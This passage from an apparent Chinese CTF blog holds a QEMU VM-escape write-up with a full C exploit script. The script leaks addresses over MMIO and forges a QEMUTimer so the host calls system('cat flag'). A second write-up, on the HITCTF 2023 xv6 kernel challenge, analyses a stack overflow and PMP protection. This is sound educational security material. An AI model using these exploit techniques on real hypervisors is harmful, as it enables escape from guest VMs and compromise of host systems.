    <span class="kt">void</span> <span class="o">*</span><span class="n">opaque</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">scale</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span> <span class="n">clock</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">active_timers_lock</span><span class="p">[</span><span class="mh">0x38</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">QEMUTimer</span> <span class="o">*</span><span class="n">active_timers</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="o">*</span><span class="n">le_next</span><span class="p">;</span>   <span class="cm">/* next element */</span>                      \
    <span class="k">struct</span> <span class="n">QEMUTimerList</span> <span class="o">**</span><span class="n">le_prev</span><span class="p">;</span>  <span class="cm">/* address of previous next element */</span>  \
    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_cb</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">notify_opaque</span><span class="p">;</span>

    <span class="cm">/* lightweight method to mark the end of timerlist's running */</span>
    <span class="kt">size_t</span> <span class="n">timers_done_ev</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>在 bss 段有一个数组 <code class="language-plaintext highlighter-rouge">main_loop_tlg[4]</code>，保存了一些 <code class="language-plaintext highlighter-rouge">QEMUTimerList</code> 结构体指针，每个 <code class="language-plaintext highlighter-rouge">active_timers</code> 都指向一个由 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 结构体组成的链表。qemu 会遍历这些 <code class="language-plaintext highlighter-rouge">QEMUTimerList</code> 来检查所有 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 有没有超时并调用它们的 callback 函数（也就是调用 <code class="language-plaintext highlighter-rouge">timer-&gt;cb(timer-&gt;opaque)</code>，相关源码见<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L588">qemu-timer.c - util/qemu-timer.c - Qemu source code (v4.2.1) - Bootlin</a>）。</p>

<p>因此，我们可以在通过 <code class="language-plaintext highlighter-rouge">main_loop_tlg</code> 泄露某个 timerlist 的地址后，劫持它的 <code class="language-plaintext highlighter-rouge">active_timers</code> 指针并伪造一个 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 结构体，从而控制程序调用函数以及参数。</p>

<p>伪造 <code class="language-plaintext highlighter-rouge">QEMUTimer</code> 时，可以这样写：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">timer</span><span class="o">-&gt;</span><span class="n">expire_time</span> <span class="o">=</span> <span class="mh">0x114514</span><span class="p">;</span>
<span class="n">timer</span><span class="o">-&gt;</span><span class="n">timer_list</span> <span class="o">=</span> <span class="err">对应的</span><span class="n">timer_list</span><span class="err">地址</span><span class="p">;</span>
<span class="n">timer</span><span class="o">-&gt;</span><span class="n">cb</span> <span class="o">=</span> <span class="n">system</span><span class="err">@</span><span class="n">plt</span><span class="p">;</span>
<span class="n">timer</span><span class="o">-&gt;</span><span class="n">opaque</span> <span class="o">=</span> <span class="s">"cat flag"</span><span class="p">;</span>
<span class="n">timer</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
<span class="n">timer</span><span class="o">-&gt;</span><span class="n">scale</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span>
</code></pre></div></div>

<p>这样程序就会在 0x114514 纳秒之后调用 <code class="language-plaintext highlighter-rouge">system("cat flag")</code>。</p>

<p>该方法主要参考了：</p>
<ul>
  <li><a href="https://blog.bi0s.in/2019/08/13/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/">QEMU VM Escape - bi0s</a></li>
  <li><a href="https://xtxtn.github.io/2023/10/11/CVE-2020-14364/#%E4%BF%AE%E6%94%B9time-list">CVE-2020-14364 - xtxtn’s Blog</a></li>
</ul>

<h3 id="exp-脚本">EXP 脚本</h3>

<p>没有在在线环境下试过这个脚本，不过猜测在线问题不大==。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _GUN_SOURCE
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/io.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mmio_mem</span><span class="p">;</span>
<span class="kt">uint32_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
<span class="p">}</span>
<span class="kt">uint32_t</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">buffer_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="n">index</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"open mmio failed"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">){</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"mmap failed !"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">uint64_t</span> <span class="n">prog_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x88</span><span class="p">);</span>
    <span class="n">prog_base</span> <span class="o">+=</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x82b35b</span><span class="p">;</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x84</span><span class="p">);</span>
    <span class="n">prog_base</span> <span class="o">|=</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]prog_base: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">prog_base</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">;</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">-</span><span class="mi">2808</span><span class="p">);</span>
    <span class="n">heap_base</span> <span class="o">+=</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mi">192</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">buf_addr</span> <span class="o">=</span> <span class="n">heap_base</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]buffer: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">);</span>

    <span class="c1">// leak timer</span>
    <span class="kt">uint64_t</span> <span class="n">main_loop_tlg</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x14B9480</span><span class="p">;</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">main_loop_tlg</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="n">buf_addr</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">timer_list</span> <span class="o">=</span> <span class="p">(</span><span class="n">prog_base</span><span class="o">&amp;</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">))</span> <span class="o">+</span> <span class="n">mmio_read</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">timer_ptr</span> <span class="o">=</span> <span class="n">timer_list</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]timer_list: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timer_list</span><span class="p">);</span>

    <span class="c1">// fake timer</span>
    <span class="kt">uint64_t</span> <span class="n">system_plt</span> <span class="o">=</span> <span class="n">prog_base</span> <span class="o">+</span> <span class="mh">0x312040</span><span class="p">;</span>

    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x114514</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">timer_list</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="n">timer_list</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">system_plt</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">system_plt</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">28</span><span class="p">,</span> <span class="p">(</span><span class="n">buf_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">44</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mh">0x20746163</span><span class="p">);</span> <span class="c1">// cat\x20</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="mh">0x67616c66</span><span class="p">);</span> <span class="c1">// flag</span>
    <span class="n">buffer_write</span><span class="p">(</span><span class="mi">56</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>          <span class="c1">// \0</span>

    <span class="c1">// 劫持 target</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">timer_ptr</span> <span class="o">-</span> <span class="n">buf_addr</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[-]offset: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
    <span class="n">mmio_write</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="n">buf_addr</span><span class="o">&amp;</span><span class="mh">0xffffffff</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="pwn" /><category term="qemu" /><summary type="html"><![CDATA[第一次从qemu里面逃出来，但没有完全逃出来，远程没通比赛就结束了S.H.I.T]]></summary></entry><entry><title type="html">HITCTF 2023 xv6-Trusted</title><link href="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html" rel="alternate" type="text/html" title="HITCTF 2023 xv6-Trusted" /><published>2023-11-29T09:58:33+08:00</published><updated>2023-11-29T09:58:33+08:00</updated><id>https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted</id><content type="html" xml:base="https://www.cameudis.com/2023/11/29/HITCTF2023-xv6-Trusted.html"><![CDATA[<p>第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。</p>

<h2 id="程序分析">程序分析</h2>

<p>本程序由教学操作系统 xv6 改编而来，是一道 RISC-V 内核漏洞利用题。
在 xv6 中，没有地址随机化机制。但有着页表权限保护，也就是 R/W/X 权限位；并且在 xv6 通过 ecall 进入 supervisor mode 时，会将页表切换到内核页表，从而屏蔽对于用户内存地址的访问。</p>

<p>题目的目标是读出位于内核的数据段中的 flag，出题人贴心地给出了一个 <code class="language-plaintext highlighter-rouge">backdoor</code> 函数来帮我们读出 flag：</p>

<pre><code class="language-RISC-V">.text:000000008000620C                 # public backdoor
.text:000000008000620C backdoor:
.text:000000008000620C
.text:000000008000620C var_s0          =  0
.text:000000008000620C var_s8          =  8
.text:000000008000620C arg_0           =  10h
.text:000000008000620C
.text:000000008000620C                 addi            sp, sp, -10h
.text:000000008000620E                 sd              ra, var_s8(sp)
.text:0000000080006210                 sd              s0, var_s0(sp)
.text:0000000080006212                 addi            s0, sp, arg_0
.text:0000000080006214                 li              a0, 80008860h
.text:0000000080006220                 lui             a1, %hi(10000000h)
.text:0000000080006224                 li              a2, 0
.text:0000000080006226                 li              a3, 20h # ' '
.text:000000008000622A
.text:000000008000622A loop:                                   # CODE XREF: backdoor+2A↓j
.text:000000008000622A                 lb              a4, 0(a0)
.text:000000008000622E                 sb              a4, %lo(10000000h)(a1)
.text:0000000080006232                 addi            a0, a0, 1
.text:0000000080006234                 addi            a2, a2, 1
.text:0000000080006236                 blt             a2, a3, loop
.text:000000008000623A                 la              a0, aHeyHereIsYourF # "Hey, here is your flag"
.text:0000000080006242                 call            panic
.text:0000000080006242 # End of function backdoor
</code></pre>

<p>但不幸的是，内核中为 flag 所处的内存提供了额外的 PMP（Physical Memory Protection）保护，这里只是简单介绍一下用途，具体细节可以去阅读 RISC-V 特权手册（<a href="https://github.com/riscv/riscv-isa-manual">riscv/riscv-isa-manual: RISC-V Instruction Set Manual</a>）的对应章节（位于 Machine-Level ISA, Version 1.12 中）。</p>

<p>在 RISC-V 中有三种权限等级：通常机器启动时处于 <strong>machine mode</strong>、内核运行在 <strong>supervisor mode</strong>、用户程序运行在 <strong>user mode</strong>。
PMP 是一种由 <strong>machine mode</strong> 进行设置和修改的保护，可以给某段内存设置可读、可写、可执行等权限，并对 <strong>supervisor mode</strong> 和 <strong>user mode</strong> 生效。</p>

<p>在 <code class="language-plaintext highlighter-rouge">start</code> 函数中，内核为 flag 所在内存添加了不可读、不可写、不可执行的权限保护：</p>

<pre><code class="language-RISC-V">.text:00000000800000D8                 la              a5, flag # "HITCTF2023{true_flag_on_server}"
.text:00000000800000E0                 srli            a5, a5, 2
.text:00000000800000E2                 ori             a5, a5, 3
.text:00000000800000E6                 csrw            pmpaddr0, a5
.text:00000000800000EA                 csrw            pmpaddr1, a4
.text:00000000800000EE                 li              a5, -1
.text:00000000800000F0                 srli            a5, a5, 0Ah
.text:00000000800000F2                 csrw            pmpaddr2, a5
.text:00000000800000F6                 li              a5, 0F0018h
.text:00000000800000FC                 csrw            pmpcfg0, a5
</code></pre>

<p>因此，就算我们直接在内核中调用 backdoor 函数，也只能看到一个报错而不是 Flag。（做题的时候以为马上出 flag 了，然后就遇到了禁止访问的报错，一时很难绷住）
我们想要读出 flag，就一定需要处于 machine mode 中，或者在 machine mode 中将保护关闭，但可以通过搜索 <code class="language-plaintext highlighter-rouge">pmpaddr</code> 的方法发现程序本身并没有提供关闭保护的功能（</p>

<h2 id="漏洞分析">漏洞分析</h2>

<p>第一个比较明显的漏洞，就是新添加的系统调用 <code class="language-plaintext highlighter-rouge">sys_encrypt</code> 中存在的栈溢出漏洞，官方 wp 中提供的函数源码：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uint64</span> <span class="nf">sys_encrypt</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>  
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>  
    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>  
    <span class="n">uint</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">;</span>  
    <span class="n">uint</span> <span class="n">srclen</span><span class="p">;</span>  
    <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">;</span>  
    <span class="n">uint</span> <span class="n">dstlen</span><span class="p">;</span>  
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">keyva</span><span class="p">;</span>  
    <span class="n">uint</span> <span class="n">keylen</span><span class="p">;</span>  
    <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">myproc</span><span class="p">();</span>  
    <span class="n">argaddr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">src</span><span class="p">);</span>  
    <span class="n">argint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">srclen</span><span class="p">);</span>  
    <span class="n">argaddr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dst</span><span class="p">);</span>  
    <span class="n">argint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dstlen</span><span class="p">);</span>  
    <span class="n">argaddr</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">keyva</span><span class="p">);</span>  
    <span class="n">argint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">keylen</span><span class="p">);</span>  
    <span class="n">keylen</span> <span class="o">=</span> <span class="n">keylen</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="o">?</span> <span class="n">keylen</span><span class="o">:</span> <span class="mi">256</span><span class="p">;</span>  
    <span class="n">copyin</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">keyva</span><span class="p">),</span> <span class="n">keylen</span><span class="p">);</span>  
    <span class="k">while</span><span class="p">(</span><span class="n">l</span> <span class="o">&lt;</span> <span class="n">srclen</span><span class="p">){</span>  
        <span class="n">uint</span> <span class="n">len_in_round</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  
        <span class="c1">// copy in src. stack overflow here  </span>
        <span class="k">while</span><span class="p">(</span><span class="n">len_in_round</span> <span class="o">&lt;</span> <span class="mi">256</span> <span class="o">&amp;&amp;</span> <span class="n">len_in_round</span> <span class="o">&lt;</span> <span class="n">srclen</span><span class="p">){</span>  
            <span class="n">copyin</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="n">len_in_round</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">src</span> <span class="o">+</span> <span class="n">len_in_round</span><span class="p">),</span> <span class="n">keylen</span><span class="p">);</span>  
            <span class="n">len_in_round</span> <span class="o">+=</span> <span class="n">keylen</span><span class="p">;</span>  
        <span class="p">}</span>  
        <span class="k">for</span><span class="p">(</span><span class="n">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len_in_round</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>  
            <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">keylen</span><span class="p">];</span>  
        <span class="p">}</span>  
        <span class="n">copyout</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">pagetable</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)(</span><span class="n">dst</span> <span class="o">+</span> <span class="n">l</span><span class="p">),</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len_in_round</span><span class="p">);</span>  
        <span class="n">l</span> <span class="o">+=</span> <span class="n">len_in_round</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>虽然函数的第一个 <code class="language-plaintext highlighter-rouge">copyin</code> 处对大小作了检查与限制（0x100），但第二个循环 <code class="language-plaintext highlighter-rouge">copyin</code> 很容易就会导致溢出。只要合理构造参数，我们就可以通过 <code class="language-plaintext highlighter-rouge">bufff</code> 溢出到高位。</p>

<p>第二个漏洞是页表的权限保护不当问题，原版 xv6 是没有这个问题的，而作者为了让题目能打所以手动改出了一些漏洞。</p>

<p>首先是内核代码可写。映射内核页表的代码位于 <code class="language-plaintext highlighter-rouge">vm.c-kvmmake()</code> 中，本来是长这样的：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">etext</span><span class="o">-</span><span class="n">KERNBASE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
<span class="p">...</span>
</code></pre></div></div>

<p>经过魔改后变成了这样（C 以及对应汇编）：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="n">KERNBASE</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">etext</span><span class="o">-</span><span class="n">KERNBASE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
</code></pre></div></div>

<pre><code class="language-RISC-V">.text:00000000800011FA                 la              s2, etext
.text:0000000080001202                 li              a4, 1110b
.text:0000000080001204                 la              a3, 8000h
.text:000000008000120C                 li              a2, 1
.text:000000008000120E                 slli            a2, a2, 1Fh
.text:0000000080001210                 mv              a1, a2
.text:0000000080001212                 mv              a0, s1
.text:0000000080001214                 call            kvmmap
</code></pre>

<p>其次是进程内核栈可执行，代码位于 <code class="language-plaintext highlighter-rouge">proc.c</code> 中，原来长这样：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Allocate a page for each process's kernel stack.</span>
<span class="c1">// Map it high in memory, followed by an invalid</span>
<span class="c1">// guard page.</span>
<span class="kt">void</span>
<span class="nf">proc_mapstacks</span><span class="p">(</span><span class="n">pagetable_t</span> <span class="n">kpgtbl</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">proc</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
  
  <span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">proc</span><span class="p">;</span> <span class="n">p</span> <span class="o">&lt;</span> <span class="o">&amp;</span><span class="n">proc</span><span class="p">[</span><span class="n">NPROC</span><span class="p">];</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pa</span> <span class="o">=</span> <span class="n">kalloc</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="n">pa</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
      <span class="n">panic</span><span class="p">(</span><span class="s">"kalloc"</span><span class="p">);</span>
    <span class="n">uint64</span> <span class="n">va</span> <span class="o">=</span> <span class="n">KSTACK</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">proc</span><span class="p">));</span>
    <span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">va</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">pa</span><span class="p">,</span> <span class="n">PGSIZE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>经过魔改后变成了这样（伪代码以及汇编）：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">kvmmap</span><span class="p">(</span><span class="n">kpgtbl</span><span class="p">,</span> <span class="n">va</span><span class="p">,</span> <span class="p">(</span><span class="n">uint64</span><span class="p">)</span><span class="n">pa</span><span class="p">,</span> <span class="n">PGSIZE</span><span class="p">,</span> <span class="n">PTE_R</span> <span class="o">|</span> <span class="n">PTE_W</span> <span class="o">|</span> <span class="n">PTE_X</span><span class="p">);</span>
</code></pre></div></div>

<pre><code class="language-RISC-V">.text:00000000800018CA                 li              a4, 1110b
.text:00000000800018CC                 lui             a3, 1
.text:00000000800018CE                 sub             a1, s2, a1
.text:00000000800018D2                 mv              a0, s3
.text:00000000800018D4                 call            kvmmap
</code></pre>

<p>因此，结合 xv6 没有随机化的特性，我们可以在栈上打 shellcode，且连 NOP Sled 都不用嘿嘿。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>最初的步骤：如何构造 <code class="language-plaintext highlighter-rouge">sys_encrypt</code> 参数、以及劫持返回地址、以及栈上的 shellcode 执行略去不表（算一下调一下就好 hhhh）。这里就假设我们已经可以任意执行代码了。</p>

<p>为了绕过 PMP 保护，我想到了几种思路：</p>

